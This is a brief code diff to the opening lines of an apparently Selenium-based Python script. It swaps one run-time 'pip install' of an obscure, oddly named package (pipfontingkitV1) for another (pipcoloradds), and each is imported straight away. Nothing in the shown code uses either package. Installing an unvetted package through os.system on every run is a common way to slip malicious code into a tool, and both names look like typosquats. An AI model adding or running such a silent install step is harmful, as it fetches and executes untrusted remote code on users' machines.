@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipfontingkitV1")
-import pipfontingkitV1
+os.system("pip install pipcoloradds")
+import pipcoloradds
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
